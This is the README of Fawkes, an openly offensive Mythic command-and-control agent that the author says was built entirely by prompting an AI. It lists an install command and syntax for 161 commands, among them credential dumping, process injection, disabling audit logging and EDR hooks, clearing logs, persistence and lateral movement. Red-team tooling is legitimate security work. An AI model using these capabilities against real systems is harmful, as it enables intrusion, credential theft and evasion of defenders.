# Fawkes Mythic C2 Agent

<img src="agent_icons/fawkes.svg" width="100" />

Fawkes is an entirely vibe-coded Mythic C2 agent. It started as an "I wonder" and has turned into a goal. My goal is to not write a single line of code for this agent, instead, exclusively producing it at a prompt.

I originally attempted to write the agent myself, but after cloning the example container, reading through mythic docs, watching the dev series youtube videos, and copying code from other agents like Merlin or Freyja, I decided I just didn't have time to develop my own agent. A prompt though, that I have time for.

Fawkes is a golang based agent with cross-platform capabilities. It supports **Windows** (EXE, DLL, and shellcode payloads), **Linux** (ELF binaries and shared libraries), and **macOS** (Mach-O binaries for Intel and Apple Silicon). 80 commands are cross-platform, with 62 additional Windows-only commands, 1 Windows+Linux command (mem-scan), 4 Unix-only commands, 7 Linux-only commands, and 2 macOS-only commands for a total of 161. Supports HTTP egress and TCP peer-to-peer (P2P) linking for internal pivoting.

## Installation
To install Fawkes, you'll need Mythic installed on a remote computer. You can find installation instructions for Mythic at the [Mythic project page](https://github.com/its-a-feature/Mythic/).

From the Mythic install directory:

```
./mythic-cli install github https://github.com/galoryber/fawkes
```

## Commands Quick Reference

Command | Syntax | Description
------- | ------ | -----------
adcs | `adcs -action <cas\|templates\|find> -server <DC> -username <user@domain> -password <pass>` | Enumerate AD Certificate Services and find vulnerable templates (ESC1-ESC4). Includes security descriptor parsing for enrollment permissions. Cross-platform (T1649).
ads | `ads -action <write\|read\|list\|delete> -file <path> [-stream <name>] [-data <content>] [-hex true]` | **(Windows only)** Manage NTFS Alternate Data Streams — write, read, list, or delete hidden data streams. Supports text and hex-encoded binary. MITRE T1564.004.
amcache | `amcache -action <query\|search\|delete\|clear> [-name <pattern>] [-count <n>]` | **(Windows only)** Query and clean Windows Shimcache (AppCompatCache) execution history. Removes forensic evidence of tool execution (T1070.004).
apc-injection | `apc-injection` | **(Windows only)** Perform QueueUserAPC injection into an alertable thread. Use `ts` to find alertable threads (T1055.004).
auditpol | `auditpol -action <query\|disable\|enable\|stealth> [-category <name\|all>]` | **(Windows only)** Query and modify Windows audit policies. Disable security event logging before sensitive operations. Stealth mode disables detection-critical subcategories. Uses AuditQuerySystemPolicy API (T1562.002).
argue | `argue -command "cmd.exe /c whoami" -spoof "cmd.exe /c echo hello"` | **(Windows only)** Execute a command with spoofed process arguments. Defeats Sysmon Event ID 1 and EDR command-line telemetry (T1564.010).
arp | `arp` | Display ARP table — shows IP-to-MAC address mappings for nearby hosts. Cross-platform.
asrep-roast | `asrep-roast -server <DC> -username <user@domain> -password <pass> [-account <target>]` | Request AS-REP tickets for accounts without pre-authentication and extract hashes in hashcat format for offline cracking. Auto-enumerates via LDAP. Cross-platform (T1558.004).
av-detect | `av-detect` | Detect installed AV/EDR/security products by scanning running processes against a 130+ signature database. Reports product, vendor, type, and PID. Cross-platform.
autopatch | `autopatch <dll_name> <function_name> <num_bytes>` | **(Windows only)** Automatically patch a function by jumping to nearest return (C3) instruction. Useful for AMSI/ETW bypasses.
base64 | `base64 -action <encode\|decode> -input <string_or_file> [-file true] [-output <path>]` | Encode/decode base64 for strings and files. File I/O support for encoding binaries and decoding to disk. Cross-platform (T1132.001).
bits | `bits -action <list\|create\|persist\|cancel> [-name <job>] [-url <URL>] [-path <local>] [-command <exe>]` | **(Windows only)** Manage BITS transfer jobs for persistence and stealthy file download. Create download jobs, set notification commands for persistence. Jobs survive reboots (T1197).
browser | `browser [-action <passwords>] [-browser <all\|chrome\|edge>]` | **(Windows only)** Harvest saved credentials from Chromium-based browsers (Chrome, Edge) via DPAPI + AES-GCM decryption. MITRE T1555.003.
cat | `cat <file>` | Display the contents of a file.
cd | `cd <directory>` | Change the current working directory.
chmod | `chmod -path <file> -mode <permissions> [-recursive true]` | Modify file/directory permissions with octal (755, 644) or symbolic (+x, u+rw, go-w) notation. Recursive support. Cross-platform (T1222).
chown | `chown -path <file> -owner <user> [-group <group>] [-recursive true]` | **(Linux/macOS only)** Change file/directory ownership by username/UID and group name/GID. Recursive support (T1222).
certstore | `certstore -action <list\|find> [-store <MY\|ROOT\|CA\|Trust\|TrustedPeople>] [-filter <substring>]` | **(Windows only)** Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys. Searches CurrentUser and LocalMachine. MITRE T1552.004, T1649.
clipboard | `clipboard -action <read\|write\|monitor\|dump\|stop> [-data "text"] [-interval 3]` | Read/write clipboard or continuously monitor for changes with credential pattern detection. Cross-platform (T1115).
compress | `compress -action <create\|list\|extract> -path <path> [-output <out>] [-pattern *.txt]` | Create, list, or extract zip archives for data staging and exfiltration. Pattern filter, depth/size limits. Cross-platform (T1560.001).
coerce | `coerce -server <target> -listener <attacker-ip> [-method petitpotam\|printerbug\|shadowcoerce\|all] -username <user> [-password <pass>] [-hash <NT hash>] [-domain <domain>]` | NTLM authentication coercion via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce). Forces target to authenticate to attacker listener. Pass-the-hash support. Cross-platform (T1187).
config | `config [-action show\|set] [-key sleep\|jitter\|killdate\|working_hours_start\|working_hours_end\|working_days] [-value <val>]` | View or modify runtime agent configuration — sleep, jitter, kill date, working hours. Cross-platform.
cp | `cp <source> <destination>` | Copy a file from source to destination.
cred-harvest | `cred-harvest -action <shadow\|cloud\|configs\|windows\|all> [-user <username>]` | Harvest credentials: shadow hashes (Unix), cloud configs (AWS/GCP/Azure/K8s), application secrets, PowerShell history + env vars + RDP (Windows). Cross-platform (T1552.001, T1552.004, T1003.008).
curl | `curl -url <URL> [-method GET\|POST\|PUT\|DELETE\|HEAD\|OPTIONS\|PATCH] [-headers '{"K":"V"}'] [-body <data>] [-output full\|body\|headers]` | Make HTTP/HTTPS requests from agent's network. Cloud metadata, internal services, SSRF. Cross-platform (T1106).
credman | `credman [-action <list\|dump>] [-filter <pattern>]` | **(Windows only)** Enumerate Windows Credential Manager entries. `list` shows metadata, `dump` reveals passwords. MITRE T1555.004.
defender | `defender -action <status\|exclusions\|add-exclusion\|remove-exclusion\|threats> [-type <path\|process\|extension>] [-value <val>]` | **(Windows only)** Query Defender status, manage exclusions, view threat history. WMI + registry. MITRE T1562.001.
dcom | `dcom -action exec -host <target> -command <cmd> [-args <arguments>] [-object mmc20\|shellwindows\|shellbrowser]` | **(Windows only)** Execute commands on remote hosts via DCOM lateral movement. Three objects: MMC20.Application, ShellWindows, ShellBrowserWindow. MITRE T1021.003.
debug-detect | `debug-detect` | Detect attached debuggers, analysis tools, and instrumentation. Checks IsDebuggerPresent, NtQueryInformationProcess, PEB, DR registers (Windows), TracerPid (Linux), sysctl P_TRACED (macOS), and scans for known debugger processes. Cross-platform (T1497.001).
dcsync | `dcsync -server <DC> -username <user> [-password <pass>] [-hash <NT hash>] -target <account[,account2]>` | DCSync — replicate AD credentials via DRS without touching LSASS. Extracts NTLM hashes, Kerberos keys (AES256/AES128). Supports pass-the-hash. Cross-platform (T1003.006).
dns | `dns -action <resolve\|reverse\|srv\|mx\|ns\|txt\|cname\|all\|dc\|zone-transfer> -target <host> [-server <dns_ip>]` | DNS enumeration — resolve hosts, query records, discover domain controllers, zone transfers (AXFR). Cross-platform (T1018).
du | `du -path <file_or_dir> [-max_depth <n>]` | Report disk usage for files and directories. Size breakdown by subdirectory, sorted by largest. Cross-platform (T1083).
drivers | `drivers [-filter <name>]` | Enumerate loaded kernel drivers/modules. Windows: EnumDeviceDrivers, Linux: /proc/modules, macOS: kext enumeration. Cross-platform (T1082).
domain-policy | `domain-policy -action <all\|password\|lockout\|fgpp> -server <DC> -username <user@domain> -password <pass>` | AD password/lockout policy and FGPP enumeration via LDAP. Spray-safe recommendations. Cross-platform (T1201).
crontab | `crontab -action <list\|add\|remove> [-entry <cron_line>] [-program <path>] [-schedule <schedule>]` | **(Linux/macOS only)** List, add, or remove cron jobs for persistence. Supports raw cron entries or program+schedule syntax.
download | `download <path>` | Download a file from the target. Supports chunked file transfer for any file size and file browser integration.
drives | `drives` | List available drives/volumes and mounted filesystems with type, label/device, and free/total space.
enum-tokens | `enum-tokens [-action list\|unique] [-user <filter>]` | **(Windows only)** Enumerate access tokens across all processes. `list` shows PID/user/integrity/session for each process. `unique` groups by user with process counts. Auto-enables SeDebugPrivilege (T1134, T1057).
env | `env [filter]` | List environment variables. Optionally filter by name (case-insensitive).
etw | `etw -action <sessions\|providers\|stop\|blind> [-session_name <name>] [-provider <guid\|shorthand>]` | **(Windows only)** Enumerate, stop, or blind ETW trace sessions and providers. `stop` kills a session; `blind` surgically disables a provider within a session (stealthier). Shorthands: sysmon, amsi, powershell, dotnet, winrm, kernel-process, etc. (T1082, T1562.002, T1562.006).
eventlog | `eventlog -action <list\|query\|clear\|info> [-channel <name>] [-event_id <id>] [-filter <xpath>] [-count <max>]` | **(Windows only)** Manage Windows Event Logs via wevtapi.dll. List channels, query events (XPath/EventID/time filtering), clear logs, get channel info. MITRE T1070.001.
execute-memory | `execute-memory -arguments 'arg1 arg2' -timeout 60` | **(Linux only)** Execute an ELF binary entirely from memory via memfd_create. No file written to disk — binary exists only in an anonymous memory-backed file descriptor. MITRE T1620.
execute-shellcode | `execute-shellcode` | **(Windows only)** Execute shellcode in the current process via VirtualAlloc + CreateThread. No cross-process injection — runs in a new thread within the agent (T1059.006).
exit | `exit` | Task agent to exit.
find | `find -pattern <glob> [-path <dir>] [-max_depth <n>]` | Search for files by name pattern. Cross-platform recursive file search with depth limit.
find-admin | `find-admin -hosts <targets> -username <user> -password <pass> [-method smb\|winrm\|both] [-hash <NT>]` | Sweep hosts to discover where credentials have admin access via SMB (C$ share) and/or WinRM. Supports CIDR, IP ranges, PTH, parallel scanning (T1021.002, T1021.006).
firewall | `firewall -action <list\|add\|delete\|enable\|disable\|status> [-name <rule>] [-direction <in\|out>] [-protocol <tcp\|udp\|any>] [-port <port>]` | **(Windows only)** Manage Windows Firewall rules via COM API. List/filter rules, add/delete rules, enable/disable rules, check profile status. MITRE T1562.004.
getprivs | `getprivs -action list\|enable\|disable\|strip [-privilege <name>]` | **(Windows only)** List, enable, disable, or strip token privileges. Strip disables all non-essential privs to reduce EDR detection surface (T1134.002).
getsystem | `getsystem [-technique steal]` | **(Windows only)** Elevate to SYSTEM by stealing a token from a SYSTEM process (winlogon.exe). Requires admin/SeDebugPrivilege (T1134.001).
gpp-password | `gpp-password -server <DC> -username <user@domain> -password <pass>` | Search SYSVOL for GPP XML files with encrypted cpassword attributes and decrypt using the published AES key (MS14-025). Cross-platform via SMB (T1552.006).
gpo | `gpo -action <list\|links\|find\|all> -server <DC> -username <user@domain> -password <pass> [-filter <name>]` | Enumerate Group Policy Objects via LDAP — list GPOs, map links with enforcement, find interesting CSE settings. Cross-platform (T1615).
grep | `grep -pattern <regex> [-path <dir>] [-extensions .txt,.xml] [-ignore_case] [-max_results 100]` | Search file contents for regex patterns. Recursive directory search with extension filtering, context lines, and binary file skipping. Cross-platform (T1083, T1552.001).
hash | `hash -path <file_or_dir> [-algorithm md5\|sha1\|sha256\|sha512] [-recursive true] [-pattern *.exe] [-max_files 500]` | Compute file hashes (MD5, SHA-1, SHA-256, SHA-512). Single files or directories with glob pattern filtering and depth control. Cross-platform (T1083).
hexdump | `hexdump -path <file> [-offset <bytes>] [-length <bytes>]` | Display file contents in xxd-style hex+ASCII format. Offset/length control for examining specific regions, max 4096 bytes. Cross-platform (T1005).
handles | `handles -pid <pid> [-type File] [-show_names] [-max_count 500]` | **(Windows only)** Enumerate open handles in a process via NtQuerySystemInformation. Type summary, name resolution, type filtering (T1057, T1082).
hashdump | `hashdump` | **(Windows only)** Extract local account NTLM hashes from the SAM database. Uses registry backup semantics to bypass DACLs. Output format: user:RID:LM:NT:::. Requires admin. MITRE T1003.002.
history-scrub | `history-scrub [-action list\|clear\|clear-all] [-user <username>]` | List or clear shell/application command history files. Covers bash, zsh, fish, PowerShell, python, mysql, and more. Cross-platform (T1070.003).
hollow | `hollow -filename <shellcode> [-target <process>] [-ppid <pid>] [-block_dlls true]` | **(Windows only)** Process hollowing — create suspended process, write shellcode, redirect thread via SetThreadContext. PPID spoofing + DLL blocking. MITRE T1055.012.
ifconfig | `ifconfig` | List network interfaces with addresses, MAC, MTU, and flags. Cross-platform (Windows/Linux/macOS).
inline-assembly | `inline-assembly` | **(Windows only)** Execute a .NET assembly in memory using the CLR. Supports command-line arguments. Use `start-clr` first for AMSI patching workflow.
inline-execute | `inline-execute` | **(Windows only)** Execute a Beacon Object File (BOF/COFF) in memory. Supports all argument types: strings (z), wide strings (Z), integers (i), shorts (s), and binary (b).
reflective-load | `reflective-load -dll_b64 <base64_dll> [-function <export>]` | **(Windows only)** Load a native PE (DLL) from memory into the current process. Manual PE mapping with section copying, relocation fixups, import resolution, and DllMain invocation. Optionally call exported functions (T1620).
iptables | `iptables -action <status\|rules\|nat\|add\|delete\|flush> [-rule <args>] [-table <name>]` | **(Linux only)** Linux firewall enumeration and management via iptables/nftables/ufw. IP forwarding, connection tracking, rule listing and modification. MITRE T1562.004.
kerberoast | `kerberoast -server <DC> -username <user@domain> -password <pass> [-spn <SPN>]` | Request TGS tickets for SPN accounts and extract hashes in hashcat format for offline cracking. Auto-enumerates via LDAP. Cross-platform (T1558.003).
klist | `klist -action <list\|purge\|dump\|import> [-server <filter>] [-ticket <base64>] [-path <path>]` | Enumerate, dump, purge, and import Kerberos tickets. Import enables Pass-the-Ticket: Windows injects kirbi via LSA, Linux/macOS writes ccache + sets KRB5CCNAME. Cross-platform (T1558, T1550.003).
keychain | `keychain -action <list\|dump\|find-password\|find-internet\|find-cert> [-service <name>] [-server <host>]` | **(macOS only)** Access macOS Keychain — list keychains, dump metadata, find generic/internet passwords, enumerate certificates.
kerb-delegation | `kerb-delegation -action <all\|unconstrained\|constrained\|rbcd> -server <DC> -username <user@domain> -password <pass>` | Enumerate Kerberos delegation relationships — unconstrained, constrained (with protocol transition), RBCD. Detects sensitive accounts. Cross-platform (T1550.003).
keylog | `keylog -action <start\|stop\|dump>` | **(Windows only)** Low-level keyboard logger with window context. Start/stop/dump captured keystrokes.
ldap-query | `ldap-query -action <users\|computers\|groups\|domain-admins\|spns\|asrep\|query> -server <DC>` | Query Active Directory via LDAP. Preset queries for users, computers, groups, domain admins, SPNs, AS-REP roastable accounts, or custom LDAP filters. Cross-platform (T1087.002).
ldap-write | `ldap-write -action <add-member\|remove-member\|set-attr\|add-attr\|remove-attr\|set-spn\|disable\|enable\|set-password\|shadow-cred\|clear-shadow-cred> -server <DC> -target <obj>` | Modify AD objects via LDAP. Group membership, attributes, SPNs, account enable/disable, password reset, shadow credentials (msDS-KeyCredentialLink). Cross-platform (T1098, T1556.006).
kill | `kill -pid <PID>` | Terminate a process by PID. Cross-platform (Windows/Linux/macOS).
laps | `laps -server <DC> -username <user@domain> -password <pass> [-filter <computer>]` | Read LAPS passwords from AD via LDAP. Supports LAPS v1 (ms-Mcs-AdmPwd) and Windows LAPS v2 (ms-LAPS-Password). Cross-platform (T1552.006).
lsa-secrets | `lsa-secrets -action <dump\|cached>` | **(Windows only)** Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2/MSCacheV2 hashcat format). Requires SYSTEM (T1003.004, T1003.005).
launchagent | `launchagent -action <install\|remove\|list> -label <com.example.name> [-path <exe>] [-daemon true]` | **(macOS only)** Install, remove, or list LaunchAgent/LaunchDaemon persistence. Creates plist with RunAtLoad+KeepAlive.
link | `link -host <ip> -port <port>` | Link to a TCP P2P agent for internal pivoting. Target agent must be built with TCP profile. Cross-platform (T1572).
linux-logs | `linux-logs -action <list\|read\|logins\|clear\|truncate\|shred> [-file <path>] [-search <filter>] [-lines <n>]` | **(Linux only)** List, read, clear, or tamper with Linux log files and binary login records (wtmp/btmp/utmp). Supports selective line removal and secure shredding (T1070.002).
logonsessions | `logonsessions [-action list\|users] [-filter <name>]` | **(Windows only)** Enumerate active logon sessions — users, session IDs, stations, connection state. Filter by username/domain.
ls | `ls [path]` | List files and folders with owner/group and timestamps. File browser integration. Defaults to cwd.
make-token | `make-token -username <user> -domain <domain> -password <pass> [-logon_type <type>]` | **(Windows only)** Create a token from credentials and impersonate it.
mkdir | `mkdir <directory>` | Create a new directory (creates parent directories if needed).
module-stomping | `module-stomping -pid <PID> [-dll_name <DLL>]` | **(Windows only)** Inject shellcode by stomping a legitimate DLL's .text section. Shellcode executes from signed DLL address space, bypassing private-memory detection (T1055.001).
modules | `modules [-pid <PID>]` | List loaded modules/DLLs/libraries in a process. Windows: CreateToolhelp32Snapshot. Linux: /proc/pid/maps. macOS: proc_info syscall. Default: current process. Cross-platform (T1057).
mem-scan | `mem-scan -pid <PID> -pattern <string> [-hex] [-max_results <n>] [-context_bytes <n>]` | Search process memory for byte patterns with hex dump output. Windows: VirtualQueryEx/ReadProcessMemory. Linux: /proc/pid/maps+mem. Supports string and hex patterns (T1005, T1057).
mv | `mv <source> <destination>` | Move or rename a file from source to destination.
named-pipes | `named-pipes [-filter <pattern>]` | **(Windows only)** List named pipes on the system for IPC discovery and pipe-based privilege escalation recon. Supports substring filtering (T1083).
net-enum | `net-enum -action <users\|localgroups\|groupmembers\|domainusers\|domaingroups\|domaininfo> [-target <group>]` | **(Windows only)** Enumerate local/domain users, groups, and domain info via Win32 API (no subprocess).
net-group | `net-group -action <list\|members\|user\|privileged> -server <DC> [-group <name>] [-user <sAMAccountName>] -username <user@domain> -password <pass>` | Enumerate AD group memberships via LDAP. Recursive member resolution, user group lookup, privileged group enumeration. Cross-platform (T1069.002).
net-localgroup | `net-localgroup -action <list\|members\|admins> [-group <name>] [-server <host>]` | **(Windows only)** Enumerate local groups and members on local or remote hosts. `admins` shortcut for quick local admin discovery. Shows SID type (User/Group/WellKnownGroup). MITRE T1069.001.
net-loggedon | `net-loggedon [-target <host>]` | **(Windows only)** Enumerate logged-on users via NetWkstaUserEnum. Shows username, logon domain, and logon server. MITRE T1033.
net-session | `net-session [-target <host>]` | **(Windows only)** Enumerate active SMB sessions via NetSessionEnum. Level 502 (admin, full detail) with fallback to level 10 (no admin). MITRE T1049.
net-shares | `net-shares -action <local\|remote\|mapped> [-target <host>]` | **(Windows only)** Enumerate network shares and mapped drives via Win32 API (no subprocess).
net-user | `net-user -action <add\|delete\|info\|password\|group-add\|group-remove> -username <name> [-password <pass>] [-group <group>]` | **(Windows only)** Manage local user accounts and group membership via netapi32 API. MITRE T1136.001, T1098.
net-stat | `net-stat` | List active network connections and listening ports with protocol, state, and PID. Cross-platform.
ntdll-unhook | `ntdll-unhook [-action unhook\|check]` | **(Windows only)** Remove EDR inline hooks from ntdll.dll by restoring the .text section from a clean on-disk copy. `check` reports hooks without removing them (T1562.001).
syscalls | `syscalls [-action status\|list\|init]` | **(Windows only)** Indirect syscall resolver. Parses ntdll exports to resolve Nt* syscall numbers and generates stubs that jump to ntdll's syscall;ret gadget. When active, injection commands bypass userland API hooks (T1106).
opus-injection | `opus-injection` | **(Windows only)** Callback-based process injection. Variant 1: Ctrl-C Handler Chain. Variant 4: PEB KernelCallbackTable. [Details](research/injection-techniques.md#opus-injection)
persist | `persist -method <registry\|startup-folder\|com-hijack\|screensaver\|ifeo\|list> -action <install\|remove>` | **(Windows only)** Install or remove persistence via registry Run keys, startup folder, COM hijacking (T1546.015), screensaver hijacking (T1546.002), or IFEO debugger (T1546.012). IFEO targets accessible from lock screen (sethc, utilman, osk).
poolparty-injection | `poolparty-injection` | **(Windows only)** Inject shellcode using PoolParty techniques that abuse Windows Thread Pool internals. All 8 variants supported. [Details](research/injection-techniques.md#poolparty-injection)
port-scan | `port-scan -hosts <IPs/CIDRs> [-ports <ports>] [-timeout <s>]` | TCP connect scan for network service discovery. Supports CIDR, IP ranges, and port ranges. Cross-platform.
powershell | `powershell [command]` | **(Windows only)** Execute a PowerShell command or script directly via powershell.exe with -NoProfile -ExecutionPolicy Bypass.
prefetch | `prefetch -action <list\|parse\|delete\|clear> [-name <exe>] [-count <max>]` | **(Windows only)** Parse and manage Windows Prefetch files. List executed programs, parse run history (up to 8 timestamps), delete specific entries, or clear all. Supports MAM-compressed files (T1070.004).
privesc-check | `privesc-check -action <all\|suid\|capabilities\|sudo\|writable\|container>` | **(Linux only)** Privilege escalation enumeration: SUID/SGID binaries, file capabilities, sudo rules, writable PATH dirs, container detection. MITRE T1548.
psexec | `psexec -host <target> -command <cmd> [-name <svcname>] [-cleanup <true\|false>]` | **(Windows only)** Execute commands on remote hosts via SCM service creation — PSExec-style lateral movement. MITRE T1021.002, T1569.002.
proc-info | `proc-info -action <info\|connections\|mounts\|modules> [-pid <PID>]` | **(Linux only)** Deep /proc inspection: process details (cmdline, env, caps, cgroups, namespaces, FDs), network connections with PID resolution, mounts, kernel modules. MITRE T1057.
procdump | `procdump [-action lsass\|dump] [-pid <PID>]` | **(Windows only)** Dump process memory via MiniDumpWriteDump. Auto-finds lsass.exe or dump any process by PID. Uploads to Mythic and cleans from disk. PPL detection. MITRE T1003.001.
ps | `ps [-v] [-i PID] [filter]` | List running processes with Mythic process browser integration. Supports PID filtering, name search, and clickable table UI. Cross-platform.
ptrace-inject | `ptrace-inject -action <check\|inject> [-pid <PID>] [-filename <shellcode>] [-restore <true>] [-timeout <30>]` | **(Linux only, x86_64)** Process injection via ptrace — PTRACE_ATTACH/POKETEXT/SETREGS with register and code restore. Check mode reports ptrace_scope, capabilities, and candidates (T1055.008).
pwd | `pwd` | Print working directory.
read-memory | `read-memory <dll_name> <function_name> <start_index> <num_bytes>` | **(Windows only)** Read bytes from a DLL function address.
reg-delete | `reg-delete -hive <HIVE> -path <path> [-name <value>] [-recursive <true>]` | **(Windows only)** Delete a registry value, key, or key tree (recursive). MITRE T1112.
reg-read | `reg-read -hive <HIVE> -path <path> [-name <value>]` | **(Windows only)** Read a registry value or enumerate all values/subkeys under a key.
reg-save | `reg-save -action <save\|creds> [-hive HKLM] [-path SAM] [-output C:\Temp\sam.hiv]` | **(Windows only)** Export registry hives to files for offline credential extraction. Use 'creds' to export SAM+SECURITY+SYSTEM. MITRE T1003.002, T1003.004.
reg-search | `reg-search -pattern <search> [-hive HKLM] [-path SOFTWARE] [-max_depth 5] [-max_results 50]` | **(Windows only)** Recursively search registry keys, value names, and value data for a case-insensitive pattern. MITRE T1012.
reg-write | `reg-write -hive <HIVE> -path <path> -name <name> -data <data> -type <type>` | **(Windows only)** Write a value to the Windows Registry. Creates keys if needed.
rev2self | `rev2self` | **(Windows only)** Revert to the original security context by dropping any active impersonation token.
route | `route` | Display the system routing table. Windows: GetIpForwardTable API, Linux: /proc/net/route + IPv6, macOS: netstat -rn. Cross-platform (T1016).
rpfwd | `rpfwd start <port> <remote_ip> <remote_port>` / `rpfwd stop <port>` | Reverse port forward -- agent listens, Mythic routes to target. Cross-platform (T1090).
rm | `rm <path>` | Remove a file or directory (recursively removes directories).
run | `run <command>` | Execute a shell command and return the output.
schtask | `schtask -action <create\|query\|delete\|run\|list> -name <name> [-program <path>]` | **(Windows only)** Create, query, run, or delete Windows scheduled tasks via COM API.
screenshot | `screenshot` | Capture a screenshot of the current desktop session. Uploads as PNG. Windows: GDI multi-monitor capture. macOS: screencapture. Linux: auto-detects X11/Wayland tools (import, scrot, gnome-screenshot, grim). Cross-platform (T1113).
secure-delete | `secure-delete -path <file_or_dir> [-passes <n>]` | Securely delete files by overwriting with random data before removal. Configurable passes (default 3), recursive directory support. Prevents forensic recovery. Cross-platform (T1070.004).
smb | `smb -action <shares\|ls\|cat\|upload\|rm> -host <target> -username <user> [-password <pass>] [-hash <NT hash>] [-share <name>] [-path <path>]` | SMB2 file operations on remote shares — list shares, browse directories, read/write/delete files. NTLM auth with pass-the-hash support. Cross-platform (T1021.002, T1550.002).
service | `service -action <query\|start\|stop\|create\|delete\|list> -name <name> [-binpath <path>]` | **(Windows only)** Manage Windows services via SCM API (no subprocess).
setenv | `setenv -action <set\|unset> -name <NAME> [-value <VALUE>]` | Set or unset environment variables in the agent process. Cross-platform.
shell-config | `shell-config -action <history\|list\|read\|inject\|remove> [-file <.bashrc>] [-line <cmd>] [-lines <count>]` | **(Linux/macOS only)** Read shell history, list/read/inject/remove shell config files. Persistence via .bashrc/.zshrc + credential harvesting from history. MITRE T1546.004, T1552.003.
sleep | `sleep [seconds] [jitter] [working_start] [working_end] [working_days]` | Set callback interval, jitter, and working hours. Working hours restrict check-ins to specified times/days for opsec.
socks | `socks start [port]` / `socks stop [port]` | Start or stop a SOCKS5 proxy through the callback. Default port 7000. Tunnel tools like proxychains, nmap, or Impacket through the agent.
spawn | `spawn -path <exe> [-ppid <pid>] [-blockdlls true]` | **(Windows only)** Spawn a suspended process or thread for injection. Supports PPID spoofing (T1134.004) and non-Microsoft DLL blocking.
spray | `spray -action <kerberos\|ldap\|smb> -server <DC> -domain <DOMAIN> -users <user1\nuser2> [-password <pass>] [-hash <NT hash>] [-delay <ms>] [-jitter <0-100>]` | Password spray against AD via Kerberos pre-auth, LDAP bind, or SMB auth. SMB supports pass-the-hash. Lockout-aware with configurable delay/jitter. Cross-platform (T1110.003, T1550.002).
ssh | `ssh -host <target> -username <user> [-password <pass>] [-key_path <path>] [-key_data <pem>] -command <cmd>` | Execute commands on remote hosts via SSH. Password, key file, or inline key auth. Cross-platform lateral movement (T1021.004).
ssh-keys | `ssh-keys -action <list\|add\|remove\|read-private> [-key <ssh_key>] [-user <username>]` | **(Linux/macOS only)** Read or inject SSH authorized_keys. Read private keys for credential harvesting.
stat | `stat -path <file_or_dir>` | Display file/directory metadata: type, size, permissions, timestamps. Platform-specific details — inode/owner (Linux/macOS), file attributes (Windows). Symlink-aware via Lstat. Cross-platform (T1083).
strings | `strings -path <file> [-min_length <n>] [-pattern <text>] [-offset <bytes>] [-max_size <bytes>]` | Extract printable ASCII strings from files. Find embedded text, URLs, credentials in binaries. Pattern filter, min length control, offset/max_size. Cross-platform (T1005).
start-clr | `start-clr` | **(Windows only)** Initialize the CLR v4.0.30319 with optional AMSI/ETW patching (Ret Patch, Autopatch, or Hardware Breakpoint).
systemd-persist | `systemd-persist -action <install\|remove\|list> -name <unit> [-exec_start <cmd>] [-timer <calendar>] [-system true]` | **(Linux only)** Install, remove, or list systemd service/timer persistence. User or system scope. MITRE T1543.002.
steal-token | `steal-token <pid>` | **(Windows only)** Steal and impersonate a security token from another process.
sysinfo | `sysinfo` | Comprehensive system information: OS version, hardware, memory, uptime, domain, .NET (Windows), SELinux/SIP status. Cross-platform (T1082).
tail | `tail -path <file> [-lines <N>] [-head true] [-bytes <N>]` | Read first or last N lines/bytes of a file without transferring entire contents. Ring buffer for efficient tail, reverse-seek for large files. Cross-platform (T1005, T1083).
touch | `touch -path <file> [-mkdir true]` | Create an empty file or update existing file timestamps. Optional parent directory creation. Cross-platform (T1106).
thread-hijack | `thread-hijack -pid <PID> [-tid <TID>]` | **(Windows only)** Inject shellcode via thread execution hijacking — suspend existing thread, redirect RIP to shellcode, resume. Avoids CreateRemoteThread detection (T1055.003).
threadless-inject | `threadless-inject` | **(Windows only)** Inject shellcode using threadless injection by hooking a DLL function in a remote process. More stealthy than vanilla injection as it doesn't create new threads.
ticket | `ticket -action forge\|request\|s4u -realm <DOMAIN> -username <user> -key <hex_key> [-key_type aes256\|aes128\|rc4] [-format kirbi\|ccache] [-domain_sid <SID>] [-spn <SPN>] [-server <KDC>] [-impersonate <user>]` | Forge, request, or delegate Kerberos tickets. Forge: Golden/Silver Tickets (offline). Request: Overpass-the-Hash (online). S4U: constrained delegation abuse via S4U2Self+S4U2Proxy. Cross-platform (T1558.001, T1558.002, T1550.002, T1134.001).
trust | `trust -server <DC> -username <user@domain> -password <pass> [-use_tls]` | Enumerate domain and forest trust relationships via LDAP. Identifies trust direction, type, SID filtering, and attack paths. Cross-platform (T1482).
timestomp | `timestomp -action <get\|copy\|set> -target <file> [-source <file>] [-timestamp <time>]` | Modify file timestamps to blend in. Get, copy from another file, or set specific time. Windows also modifies creation time.
ts | `ts [-a] [-i PID]` | **(Windows only)** List threads in processes. By default shows only alertable threads (Suspended/DelayExecution). Use -a for all threads, -i to filter by PID (T1057).
uac-bypass | `uac-bypass [-technique fodhelper\|computerdefaults\|sdclt] [-command <path>]` | **(Windows only)** Bypass UAC to escalate from medium to high integrity. Registry-based hijack + auto-elevating binary. Default spawns elevated callback (T1548.002).
unlink | `unlink -connection_id <uuid>` | Disconnect a linked TCP P2P agent. Cross-platform (T1572).
upload | `upload` | Upload a file to the target with chunked file transfer.
usn-jrnl | `usn-jrnl -action query\|recent\|delete [-volume C:]` | **(Windows only)** Query or delete NTFS USN Change Journal — destroys file operation history for anti-forensics (T1070.004).
vanilla-injection | `vanilla-injection` | **(Windows only)** Inject shellcode into a remote process using VirtualAllocEx/WriteProcessMemory/CreateRemoteThread.
vss | `vss -action <list\|create\|delete\|extract> [-volume C:\\] [-id <device_path>] [-source <path>] [-dest <path>]` | **(Windows only)** Manage Volume Shadow Copies — list, create, delete, extract files. Extract locked files (NTDS.dit, SAM) without touching lsass. MITRE T1003.003.
wc | `wc -path <file_or_dir> [-pattern <glob>]` | Count lines, words, characters, and bytes in files. Directory mode with glob pattern filtering and totals. Cross-platform (T1083).
wdigest | `wdigest -action <status\|enable\|disable>` | **(Windows only)** Manage WDigest plaintext credential caching. Enable to capture cleartext passwords at next logon. MITRE T1003.001, T1112.
winrm | `winrm -host <target> -username <user> [-password <pass>] [-hash <NT hash>] -command <cmd> [-shell cmd\|powershell]` | Execute commands on remote Windows hosts via WinRM with NTLM authentication. Supports pass-the-hash, cmd.exe and PowerShell. Cross-platform (T1021.006, T1550.002).
windows | `windows [-action list\|search] [-filter <string>] [-all]` | **(Windows only)** Enumerate visible application windows — shows HWND, PID, process name, window class, and title. Search filters by title/process/class. MITRE T1010.
